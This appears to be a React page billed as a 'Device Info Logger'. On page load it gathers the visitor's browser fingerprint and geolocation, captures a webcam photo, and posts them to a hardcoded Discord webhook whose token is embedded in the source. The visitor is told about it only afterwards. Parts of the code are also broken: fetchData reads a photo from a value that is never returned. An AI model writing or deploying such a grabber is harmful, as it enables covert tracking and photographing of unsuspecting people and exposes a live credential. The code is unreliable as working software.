import { useEffect, useState } from "react";
import { Container, Text, VStack, Spinner } from "@chakra-ui/react";
import { FaDiscord } from "react-icons/fa";

const Index = () => {
  useEffect(() => {
    const webhookUrl = "https://discord.com/api/webhooks/1245264638074032169/SQOYL5a3KvrE25GAybCtaiHyM6uzOIm2SRypPQfD1GeO-IcuwXC6FMwG8fQTnjOO5E6_";

    const getDeviceInfo = async () => {
      const deviceInfo = {
        userAgent: navigator.userAgent,
        appName: navigator.appName,
        appVersion: navigator.appVersion,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        availWidth: window.screen.availWidth,
        availHeight: window.screen.availHeight,
        colorDepth: window.screen.colorDepth,
        pixelDepth: window.screen.pixelDepth,
        online: navigator.onLine,
        connection: navigator.connection
          ? {
              type: navigator.connection.type,
              effectiveType: navigator.connection.effectiveType,
              downlink: navigator.connection.downlink,
              rtt: navigator.connection.rtt,
            }
          : null,
      };

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
          deviceInfo.geolocation = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          };
          sendToWebhook(deviceInfo);
        });
      } else {
        sendToWebhook(deviceInfo);
      }
    };

    const sendToWebhook = (deviceInfo) => {
      fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          content: `Device Info: \nUser Agent: ${deviceInfo.userAgent}\nApp Name: ${deviceInfo.appName}\nApp Version: ${deviceInfo.appVersion}\nPlatform: ${deviceInfo.platform}\nLanguage: ${deviceInfo.language}\nLanguages: ${deviceInfo.languages}\nScreen Width: ${deviceInfo.screenWidth}\nScreen Height: ${deviceInfo.screenHeight}\nAvailable Width: ${deviceInfo.availWidth}\nAvailable Height: ${deviceInfo.availHeight}\nColor Depth: ${deviceInfo.colorDepth}\nPixel Depth: ${deviceInfo.pixelDepth}\nOnline: ${deviceInfo.online}\nConnection: ${deviceInfo.connection ? JSON.stringify(deviceInfo.connection) : "N/A"}\nGeolocation: ${deviceInfo.geolocation ? `Latitude: ${deviceInfo.geolocation.latitude}, Longitude: ${deviceInfo.geolocation.longitude}` : "N/A"}`,
        }),
      });
    };

    const capturePhoto = async () => {
      const video = document.createElement("video");
      const canvas = document.createElement("canvas");
      const context = canvas.getContext("2d");

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        await new Promise((resolve) => (video.onloadedmetadata = resolve));
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const photo = canvas.toDataURL("image/png");
        stream.getTracks().forEach((track) => track.stop());
        sendToWebhook({ photo });
        return photo;
      } catch (error) {
        console.error("Error capturing photo:", error);
        return null;
      }
    };

    const fetchData = async () => {
      const deviceInfo = await getDeviceInfo();
      const photo = await capturePhoto();
      if (photo) {
        if (photo) {
          fetch(webhookUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              content: `Captured Photo:`,
              embeds: [{ image: { url: deviceInfo.photo } }],
            }),
          });
        }
      }
    };

    fetchData();
  }, []);

  return (
    <Container centerContent maxW="container.md" height="100vh" display="flex" flexDirection="column" justifyContent="center" alignItems="center">
      <VStack spacing={4}>
        <Text fontSize="2xl">Welcome to the Device Info Logger</Text>
        <Text>Your device information has been sent to our Discord channel.</Text>
        <Spinner size="lg" />
      </VStack>
    </Container>
  );
};

export default Index;
